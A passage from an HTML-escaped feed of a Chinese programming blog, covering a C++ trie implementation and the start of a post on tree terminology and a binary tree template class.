&lt;li&gt;字符串最长公共前缀（转化为寻找共同祖先问题）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;字典树和哈希表的比较（参考）：&#34;&gt;&lt;a href=&#34;#字典树和哈希表的比较（参考）：&#34; class=&#34;headerlink&#34; title=&#34;字典树和哈希表的比较（参考）：&#34;&gt;&lt;/a&gt;字典树和哈希表的比较（参考）：&lt;/h2&gt;&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/20190408165347185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01PVV9JVA==,size_16,color_FFFFFF,t_70&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2、字典树的C-实现（参考）&#34;&gt;&lt;a href=&#34;#2、字典树的C-实现（参考）&#34; class=&#34;headerlink&#34; title=&#34;2、字典树的C++实现（参考）&#34;&gt;&lt;/a&gt;2、字典树的C++实现（参考）&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;quot;stdafx.h&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const int Num = 26;             //每个节点需要保存26个字母&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct TrieNode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bool Isword;                //判断是否是单词&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TrieNode* next[Num];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TrieNode() :Isword(false)   //初始化&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        memset(next, NULL, sizeof(next));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Trie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Trie() &amp;#123; root = new TrieNode(); &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void insert(string word);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bool search(string word);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void deleteTrie(TrieNode* root);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TrieNode* root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void Trie::insert(string word)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TrieNode* location = root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt; word.length();i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (location-&amp;gt;next[word[i] - &amp;#x27;a&amp;#x27;] == nullptr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            TrieNode* temp = new TrieNode();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            location-&amp;gt;next[word[i] - &amp;#x27;a&amp;#x27;]=temp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        location = location-&amp;gt;next[word[i] - &amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    location-&amp;gt;Isword = true;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bool Trie::search(string word)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TrieNode* location = root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //while (word&amp;amp;&amp;amp;location)//注意location不能为空&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt; word.length()&amp;amp;&amp;amp;location;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        location = location-&amp;gt;next[word[i] - &amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return(location != NULL &amp;amp;&amp;amp; location-&amp;gt;Isword);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void Trie::deleteTrie(TrieNode* root)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt; Num; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (root-&amp;gt;next[i] != NULL)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            deleteTrie(root-&amp;gt;next[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    delete root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void main()                     //简单测试  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Trie tree;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n;                      //输入n个单词在字典树中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cin &amp;gt;&amp;gt; n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (n--)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        string s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cin &amp;gt;&amp;gt; s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tree.insert(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    string input;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; &amp;quot;输入要检查的单词&amp;quot; &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cin &amp;gt;&amp;gt; input;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; boolalpha &amp;lt;&amp;lt; tree.search(input) &amp;lt;&amp;lt; endl;//查找是否存在是个单词&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <updated>2023-01-13T19:46:08.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/14/CPP%E6%A0%91/</id>
        <title>CPP树</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/14/CPP%E6%A0%91/"/>
        <content type="html">&lt;h1 id=&#34;树&#34;&gt;&lt;a href=&#34;#树&#34; class=&#34;headerlink&#34; title=&#34;树&#34;&gt;&lt;/a&gt;树&lt;/h1&gt;&lt;h2 id=&#34;树的定义&#34;&gt;&lt;a href=&#34;#树的定义&#34; class=&#34;headerlink&#34; title=&#34;树的定义&#34;&gt;&lt;/a&gt;树的定义&lt;/h2&gt;&lt;p&gt;树是由一个集合以及在该集合上定义的一种关系构成的，集合中的元素称为树的结点，所定义的关系称为父子关系。父子关系在树的结点之间建立了一个层次结构，在这种层次结构中有一个结点具有特殊的地位，这个结点称为该树的根结点。&lt;/p&gt;
&lt;p&gt;数据结构中有很多树的结构，其中包括二叉树、二叉搜索树、2-3树、红黑树等等，本文着重介绍二叉树。&lt;/p&gt;
&lt;h2 id=&#34;树的基本术语&#34;&gt;&lt;a href=&#34;#树的基本术语&#34; class=&#34;headerlink&#34; title=&#34;树的基本术语&#34;&gt;&lt;/a&gt;树的基本术语&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;节点的度：一个节点含有的子树的个数称为该节点的度；&lt;/li&gt;
&lt;li&gt;叶节点或终端节点：度为0的节点称为叶节点；&lt;/li&gt;
&lt;li&gt;非终端节点或分支节点：度不为0的节点；&lt;/li&gt;
&lt;li&gt;双亲节点或父节点：若一个节点含有子节点，则这个节点称为其子节点的父节点；&lt;/li&gt;
&lt;li&gt;孩子节点或子节点：一个节点含有的子树的根节点称为该节点的子节点；&lt;/li&gt;
&lt;li&gt;兄弟节点：具有相同父节点的节点互称为兄弟节点；&lt;/li&gt;
&lt;li&gt;树的度：一棵树中，最大的节点的度称为树的度；&lt;/li&gt;
&lt;li&gt;节点的层次：从根开始定义起，根为第1层，根的子节点为第2层，以此类推；&lt;/li&gt;
&lt;li&gt;树的高度或深度：树中节点的最大层次；&lt;/li&gt;
&lt;li&gt;堂兄弟节点：双亲在同一层的节点互为堂兄弟；&lt;/li&gt;
&lt;li&gt;节点的祖先：从根到该节点所经分支上的所有节点；&lt;/li&gt;
&lt;li&gt;子孙：以某节点为根的子树中任一节点都称为该节点的子孙。&lt;/li&gt;
&lt;li&gt;森林：由m（m&amp;gt;&amp;#x3D;0）棵互不相交的树的集合称为森林；&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;树的存储结构&#34;&gt;&lt;a href=&#34;#树的存储结构&#34; class=&#34;headerlink&#34; title=&#34;树的存储结构&#34;&gt;&lt;/a&gt;树的存储结构&lt;/h2&gt;&lt;h3 id=&#34;双亲表示法&#34;&gt;&lt;a href=&#34;#双亲表示法&#34; class=&#34;headerlink&#34; title=&#34;双亲表示法&#34;&gt;&lt;/a&gt;双亲表示法&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20180611151650623?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;孩子表示法&#34;&gt;&lt;a href=&#34;#孩子表示法&#34; class=&#34;headerlink&#34; title=&#34;孩子表示法&#34;&gt;&lt;/a&gt;孩子表示法&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20180611151704448?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;二叉树&#34;&gt;&lt;a href=&#34;#二叉树&#34; class=&#34;headerlink&#34; title=&#34;二叉树&#34;&gt;&lt;/a&gt;二叉树&lt;/h2&gt;&lt;p&gt;二叉树是数据结构中一种重要的数据结构，也是树表家族最为基础的结构。&lt;/p&gt;
&lt;p&gt;二叉树的定义：二叉树的每个结点至多只有二棵子树(不存在度大于2的结点)，二叉树的子树有左右之分，次序不能颠倒。&lt;/p&gt;
&lt;h3 id=&#34;二叉树的性质&#34;&gt;&lt;a href=&#34;#二叉树的性质&#34; class=&#34;headerlink&#34; title=&#34;二叉树的性质&#34;&gt;&lt;/a&gt;二叉树的性质&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;二叉树的第i ii层至多有2 i − 1 2^{i-1}2 ^i−1个结点；&lt;/li&gt;
&lt;li&gt;深度为k的二叉树至多有2^k−1个结点；&lt;/li&gt;
&lt;li&gt;对任何一棵二叉树T，如果其终端结点数为n0，度为2的结点数为,则n0&amp;#x3D;n2+1&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;二叉树的实现&#34;&gt;&lt;a href=&#34;#二叉树的实现&#34; class=&#34;headerlink&#34; title=&#34;二叉树的实现&#34;&gt;&lt;/a&gt;二叉树的实现&lt;/h3&gt;&lt;h4 id=&#34;结构&#34;&gt;&lt;a href=&#34;#结构&#34; class=&#34;headerlink&#34; title=&#34;结构&#34;&gt;&lt;/a&gt;结构&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct BiNode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DataType data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BiNode&amp;lt;DataType&amp;gt; * lchild,*rchild;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class BiTree&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BiTree()&amp;#123;root = Create(root);&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ~BiTree()&amp;#123;Release(root);&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void PreOrder()&amp;#123;PreOrder(root);&amp;#125;	//前序遍历&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void InOrder()&amp;#123;InOrder(root);&amp;#125;		//中序遍历&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void PostOrder()&amp;#123;PostOrder(root);&amp;#125;	//后序遍历&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BiNode&amp;lt;DataType&amp;gt; * root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BiNode&amp;lt;DataType&amp;gt; * Create(BiNode&amp;lt;DataType&amp;gt; *bt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void Release(BiNode&amp;lt;DataType&amp;gt; *bt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void PreOrder(BiNode&amp;lt;DataType&amp;gt; *bt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void InOrder(BiNode&amp;lt;DataType&amp;gt; *bt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void PostOrder(BiNode&amp;lt;DataType&amp;gt; *bt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;建立二叉树&#34;&gt;&lt;a href=&#34;#建立二叉树&#34; class=&#34;headerlink&#34; title=&#34;建立二叉树&#34;&gt;&lt;/a&gt;建立二叉树&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BiNode&amp;lt;DataType&amp;gt; *BiTree&amp;lt;DataType&amp;gt;::Create(BiNode&amp;lt;DataType&amp;gt; *bt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DataType ch;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cin&amp;gt;&amp;gt;ch;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(ch == &amp;#x27;#&amp;#x27;) bt = NULL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bt = new BiNode&amp;lt;DataType&amp;gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bt-&amp;gt;data = ch;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bt-&amp;gt;lchild = Create(bt-&amp;gt;lchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bt-&amp;gt;rchild = Create(bt-&amp;gt;rchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return bt;&lt;/span&gt;&lt;br&gt;&lt;span 